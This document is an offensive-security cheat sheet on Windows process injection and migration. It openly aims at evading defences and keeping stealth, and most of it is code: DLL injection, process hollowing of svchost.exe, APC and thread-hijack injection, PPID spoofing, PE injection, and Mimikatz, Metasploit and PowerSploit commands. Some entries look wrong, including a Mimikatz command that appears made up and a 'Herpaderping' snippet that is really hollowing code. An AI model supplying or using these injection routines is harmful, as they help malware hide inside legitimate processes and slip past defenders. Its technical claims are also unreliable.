Here's a cheat sheet for **Windows Process Injection and Migration** techniques, commonly used in offensive security for evading defenses and maintaining stealth.

### **Windows Process Injection & Migration Cheat Sheet**

#### **Process Injection Techniques**

- **DLL Injection**
  
  Injecting a DLL into a target process by using API calls such as `CreateRemoteThread` and `LoadLibrary`.

  ```c
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetProcessID);
  LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
  WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);
  HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pDllPath, 0, 0);
  ```

- **Process Hollowing**

  Creating a suspended process, replacing its memory with malicious code, and resuming the process.

  ```c
  STARTUPINFOA si = { sizeof(si) };
  PROCESS_INFORMATION pi;
  CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
  WriteProcessMemory(pi.hProcess, BaseAddress, MaliciousCode, CodeSize, &Written);
  ResumeThread(pi.hThread);
  ```

- **APC (Asynchronous Procedure Call) Injection**

  Injecting code into a process by queuing an APC in the thread’s queue.

  ```c
  HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, ThreadID);
  QueueUserAPC((PAPCFUNC)InjectedCode, hThread, NULL);
  ResumeThread(hThread);
  ```

- **Reflective DLL Injection**

  Injecting a DLL into a process without writing it to disk by using reflection techniques.

  ```powershell
  Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcessID $PID
  ```

- **Thread Hijacking**

  Hijacking an existing thread of a process to execute malicious code.

  ```c
  SuspendThread(hThread);
  GetThreadContext(hThread, &ctx);
  ctx.Rip = (DWORD_PTR)InjectedCode; // For x64
  SetThreadContext(hThread, &ctx);
  ResumeThread(hThread);
  ```

- **Early Bird Injection**

  Injecting code into a process during its early stages (before the entry point is reached).

  ```c
  CreateProcessA(TargetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
  NtMapViewOfSection(...); // Map section into target process
  QueueUserAPC(...); // Queue APC to execute the payload
  ResumeThread(pi.hThread);
  ```

- **Hook Injection**

  Modifying the execution flow of a process by placing hooks (e.g., in API functions).

  ```c
  // Example: Inline hooking a function
  BYTE originalBytes[5];
  ReadProcessMemory(hProcess, targetFuncAddr, originalBytes, 5, NULL);
  WriteProcessMemory(hProcess, targetFuncAddr, hookCode, 5, NULL);
  ```

#### ** Process Migration Techniques**

- **Process Injection + Process Termination**

  Injecting code into a new process and terminating the original process.

  ```c
  // Inject into new process
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetProcessID);
  VirtualAllocEx(hProcess, ...);
  WriteProcessMemory(hProcess, ...);
  CreateRemoteThread(hProcess, ...);

  // Terminate original process
  TerminateProcess(hOriginalProcess, 0);
  ```

- **Parent Process Migration (PPID Spoofing)**

  Creating a new process with a spoofed parent process ID.

  ```c
  STARTUPINFOEXA si = { sizeof(si) };
  PROCESS_INFORMATION pi;
  UpdateProcThreadAttribute(...); // Set new PPID
  CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
  ```

- **Process Doppelgänging**

  Using a technique that involves NTFS transactions to inject code into a process without touching the disk.

  ```c
  NtCreateSection(...); // Create section in transacted file
  NtCreateProcessEx(...); // Create process using the transacted section
  ```

- **Process Herpaderping**

  A technique that obscures the real content of a PE file, allowing execution of malicious code without detection.

  ```c
  // Conceal actual payload within a legitimate-looking process
  CreateProcessA(TargetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
  WriteProcessMemory(pi.hProcess, BaseAddress, ObfuscatedCode, CodeSize, &Written);
  ResumeThread(pi.hThread);
  ```

- **PE Injection**

  Injecting a portable executable (PE) directly into a target process’s memory.

  ```c
  LPVOID pRemoteImage = VirtualAllocEx(hProcess, NULL, pPEHeaders->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(hProcess, pRemoteImage, pLocalImage, pPEHeaders->SizeOfImage, &nBytesWritten);
  ```

#### ** Tools & Commands**

- **Mimikatz**: Process Injection with Mimikatz
  
  ```powershell
  sekurlsa::inject - IfmImpersonationTarget
  ```

- **Metasploit**: Migration to another process
  
  ```bash
  migrate <PID>
  ```

- **PowerSploit**: Invoke-ReflectivePEInjection
  
  ```powershell
  Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcessID $PID
  ```

